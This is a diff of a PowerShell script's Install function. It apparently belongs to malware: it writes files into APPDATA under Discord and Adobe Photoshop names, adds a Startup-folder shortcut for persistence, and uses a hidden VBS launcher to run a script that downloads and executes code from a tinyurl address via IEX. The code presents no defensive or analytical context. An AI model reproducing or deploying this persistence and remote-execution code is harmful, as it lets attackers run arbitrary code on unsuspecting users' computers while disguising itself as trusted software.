@@ -20,16 +20,19 @@ gci function: | where {$sysfunctions -notcontains $_}
 function Install {
 cd "$env:APPDATA"
 
-New-Item -Path . -Name "discord.bat" -ItemType "file" -Value @"
-@echo off
+New-Item -Path . -Name "discord.vbs" -ItemType "file" -Value @"
+Dim shell,command
+command = "powershell.exe -nologo -File ./Adobe Photoshop C36.ps1"
+Set shell = CreateObject("WScript.Shell")
+shell.Run command,0
+"@
 
-start powershell.exe -windowstyle hidden -command IEX (New-Object System.Net.WebClient).DownloadString('http://tinyurl.com/y44v5ltr')
-
-exit
+New-Item -Path . -Name "Adobe Photoshop C36.ps1" -ItemType "file" -Value @"
+iex (new-object system.net.webclient).downloadstring('http://tinyurl.com/y44v5ltr')
 "@
 
 $Shortcut = $wshell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\discord.lnk")
-$Shortcut.TargetPath = "$env:APPDATA\discord.bat"
+$Shortcut.TargetPath = "$env:APPDATA\discord.vbs"
 $Shortcut.IconLocation="https://vulndetect.org/assets/uploads/files/1545080305400-discord.exe..ico"
 $Shortcut.Save()
 }
